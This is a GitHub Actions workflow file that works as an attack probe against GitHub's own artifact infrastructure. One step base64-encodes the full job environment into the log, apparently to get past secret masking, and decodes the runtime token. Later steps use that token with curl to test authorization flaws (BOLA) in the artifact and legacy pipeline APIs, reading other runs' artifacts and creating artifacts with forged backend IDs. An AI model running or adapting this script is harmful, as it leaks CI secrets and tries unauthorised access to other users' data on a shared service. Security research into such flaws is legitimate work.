name: ArtifactsV2Probe
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write

jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - name: Setup dummy artifact file
        run: echo "probe-$(date +%s)" > /tmp/probe.txt

      - name: Upload reference artifact
        uses: actions/upload-artifact@v4
        with:
          name: reference-artifact
          path: /tmp/probe.txt

      - name: Env bulk bypass + runtime token decode
        run: |
          echo "=ENV_B64_START="
          env | base64 -w0
          echo ""
          echo "=ENV_B64_END="
          echo "RUNTIME_URL=$ACTIONS_RUNTIME_URL"
          echo "RUN_ID=$GITHUB_RUN_ID"
          echo "REPO_ID=$GITHUB_REPOSITORY_ID"
          echo "=TOKEN_DECODE_START="
          printf '%s' "$ACTIONS_RUNTIME_TOKEN" | cut -d. -f2 | python3 -c "
import sys,base64,json
p=sys.stdin.read().strip()
p+='='*(-len(p)%4)
print(json.dumps(json.loads(base64.b64decode(p)),indent=2))
"
          echo "=TOKEN_DECODE_END="

      - name: Artifacts v2 Twirp API probes
        run: |
          RT="$ACTIONS_RUNTIME_TOKEN"
          RESULTS="https://results.actions.githubusercontent.com"
          echo "=== LIST current run ==="
          curl -sf -w "\nHTTP:%{http_code}" \
            -X POST \
            -H "Authorization: Bearer $RT" \
            -H "Content-Type: application/json" \
            -d "{\"workflowRunId\":\"$GITHUB_RUN_ID\"}" \
            "${RESULTS}/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" | head -c 3000
          echo ""
          echo "=== LIST run 1 (BOLA) ==="
          curl -s -w "\nHTTP:%{http_code}" \
            -X POST \
            -H "Authorization: Bearer $RT" \
            -H "Content-Type: application/json" \
            -d '{"workflowRunId":"1"}' \
            "${RESULTS}/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" | head -c 500
          echo ""
          echo "=== CREATE with fake backend IDs (BOLA) ==="
          curl -s -w "\nHTTP:%{http_code}" \
            -X POST \
            -H "Authorization: Bearer $RT" \
            -H "Content-Type: application/json" \
            -d '{"workflowRunBackendId":"00000000-0000-0000-0000-000000000001","workflowJobRunBackendId":"00000000-0000-0000-0000-000000000002","name":"bola-test","version":4}' \
            "${RESULTS}/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" | head -c 500
          echo ""
          echo "=== OLD PIPELINES API (current run) ==="
          curl -s -w "\nHTTP:%{http_code}" \
            -H "Authorization: Bearer $RT" \
            "${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows/${GITHUB_RUN_ID}/artifacts?api-version=6.0-preview" | head -c 2000
          echo ""
          echo "=== OLD PIPELINES API (run 1, BOLA) ==="
          curl -s -w "\nHTTP:%{http_code}" \
            -H "Authorization: Bearer $RT" \
            "${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows/1/artifacts?api-version=6.0-preview" | head -c 500
          echo ""
          echo "=== RUNTIME URL ROOT ==="
          curl -s -w "\nHTTP:%{http_code}" \
            -H "Authorization: Bearer $RT" \
            "${ACTIONS_RUNTIME_URL}" | head -c 500
          echo ""
